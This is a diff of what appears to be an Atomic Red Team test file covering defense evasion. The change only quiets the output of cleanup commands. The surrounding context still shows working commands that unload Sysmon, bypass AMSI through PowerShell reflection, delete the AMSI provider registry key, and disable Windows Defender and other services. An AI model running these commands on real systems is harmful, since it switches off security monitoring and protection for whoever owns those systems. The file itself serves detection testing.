@@ -205,7 +205,7 @@ atomic_tests:
     command: |
       sysmon -u
     cleanup_command: |
-      sysmon -i -accepteula
+      sysmon -i -accepteula >nul 2>&1
 
 - name: AMSI Bypass - AMSI InitFailed
   description: |
@@ -219,7 +219,7 @@ atomic_tests:
     command: |
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     cleanup_command: |
-      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false) -ErrorAction Ignore
 
 - name: AMSI Bypass - Remove AMSI Provider Reg Key
   description: |
@@ -232,8 +232,8 @@ atomic_tests:
     elevation_required: true
     command: |
        Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
-    cleanup_command: |
-       New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+    cleanup_command: | 
+       New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
 
 - name: Disable Arbitrary Security Windows Service
   description: |
@@ -252,8 +252,8 @@ atomic_tests:
        net.exe stop #{service_name}
        sc.exe config #{service_name} start= disabled
     cleanup_command: |
-       sc.exe config #{service_name} start= auto
-       net.exe start #{service_name}
+       sc.exe config #{service_name} start= auto >nul 2>&1
+       net.exe start #{service_name} >nul 2>&1
 
 - name: Disable PowerShell Script Block Logging
   description: |
@@ -323,8 +323,8 @@ atomic_tests:
       sc config WinDefend start=disabled
       sc query WinDefend
     cleanup_command: |
-      sc start WinDefend
-      sc config WinDefend start=enabled
+      sc start WinDefend >nul 2>&1
+      sc config WinDefend start=enabled >nul 2>&1
 
 - name: Tamper with Windows Defender Registry
   description: |
